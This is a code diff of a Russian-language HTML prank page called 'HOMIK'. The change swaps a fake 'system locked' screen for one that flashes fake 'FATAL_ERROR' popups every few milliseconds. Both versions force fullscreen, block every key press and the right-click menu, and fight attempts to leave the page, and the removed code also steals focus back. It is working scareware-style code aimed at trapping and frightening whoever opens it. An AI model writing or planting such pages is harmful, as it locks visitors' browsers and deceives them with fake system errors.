@@ -2,91 +2,85 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <title>СИСТЕМА ЗАБЛОКИРОВАНА</title>
+    <title>SYSTEM_CRITICAL_HOMIK</title>
     <style>
         body, html {
-            margin: 0;
-            padding: 0;
-            width: 100%;
-            height: 100%;
+            margin: 0; padding: 0;
+            width: 100%; height: 100%;
             background-color: black;
             color: white;
-            display: flex;
-            justify-content: center;
-            align-items: center;
+            display: flex; justify-content: center; align-items: center;
             overflow: hidden;
-            cursor: none; /* Полностью скрываем курсор */
+            cursor: none;
             user-select: none;
         }
 
         h1 {
-            font-family: Arial, sans-serif;
-            font-size: 80px;
-            letter-spacing: 15px;
-            text-transform: uppercase;
-            animation: flicker 0.1s infinite;
+            font-family: 'Courier New', monospace;
+            font-size: clamp(50px, 15vw, 150px);
+            z-index: 1000;
+            position: relative;
+            text-shadow: 0 0 20px red;
         }
 
-        @keyframes flicker {
-            0% { opacity: 1; }
-            50% { opacity: 0.8; }
-            100% { opacity: 0.9; }
+        .fake-popup {
+            position: absolute;
+            background: #c0c0c0;
+            border: 2px solid #fff;
+            border-right: 2px solid #000;
+            border-bottom: 2px solid #000;
+            width: 200px;
+            height: 100px;
+            padding: 2px;
+            z-index: 500;
+            pointer-events: none;
+        }
+
+        .popup-bar {
+            background: darkblue;
+            height: 18px;
+            width: 100%;
         }
     </style>
 </head>
-<body onclick="goFullscreen()">
+<body onclick="startChaos()">
 
     <h1>HOMIK</h1>
 
     <script>
-        // Функция принудительного полноэкранного режима при первом клике
-        function goFullscreen() {
+        function startChaos() {
             const elem = document.documentElement;
-            if (elem.requestFullscreen) {
-                elem.requestFullscreen();
-            } else if (elem.mozRequestFullScreen) {
-                elem.mozRequestFullScreen();
-            } else if (elem.webkitRequestFullscreen) {
-                elem.webkitRequestFullscreen();
-            } else if (elem.msRequestFullscreen) {
-                elem.msRequestFullscreen();
-            }
+            if (elem.requestFullscreen) elem.requestFullscreen();
+
+            setInterval(() => {
+                createPopup();
+            }, 10);
         }
 
-        // Блокировка ВСЕХ стандартных комбинаций клавиш
-        window.addEventListener('keydown', function(e) {
-            // Блокируем F12, Ctrl+Shift+I, Ctrl+U, Alt+F4, Esc и т.д.
+        function createPopup() {
+            const popup = document.createElement('div');
+            popup.className = 'fake-popup';
+            const x = Math.random() * window.innerWidth;
+            const y = Math.random() * window.innerHeight;
+            popup.style.left = x + 'px';
+            popup.style.top = y + 'px';
+            popup.innerHTML = '<div class="popup-bar"></div><div style="color:black; font-size:10px; padding:5px;">FATAL_ERROR: HOMIK.exe</div>';
+            document.body.appendChild(popup);
+
+            setTimeout(() => {
+                popup.remove();
+            }, 50);
+        }
+
+        window.addEventListener('keydown', (e) => {
             e.preventDefault();
             e.stopPropagation();
-            
-            // Дополнительный троллинг в консоли, если её всё же откроют
-            console.log("Критическая ошибка ввода. Клавиша заблокирована.");
             return false;
         }, true);
 
-        // Блокировка правой кнопки мыши (контекстного меню)
-        document.addEventListener('contextmenu', function(e) {
-            e.preventDefault();
-        });
+        document.addEventListener('contextmenu', e => e.preventDefault());
 
-        // Зацикливание фокуса (чтобы нельзя было "табнуться" наружу легко)
-        window.addEventListener('blur', function() {
-            setTimeout(() => {
-                window.focus();
-            }, 10);
-        });
-
-        // Предотвращение закрытия вкладки
-        window.onbeforeunload = function() {
-            return "Процесс HOMIK не завершен. Вы уверены?";
-        };
-
-        // Автоматический запрос на фулскрин каждые 2 секунды, если пользователь вышел из него
-        setInterval(() => {
-            if (!document.fullscreenElement) {
-                console.log("Требуется полноэкранный режим");
-            }
-        }, 2000);
+        window.onbeforeunload = () => "HOMIK СЛЕДИТ ЗА ТОБОЙ";
     </script>
 </body>
 </html>
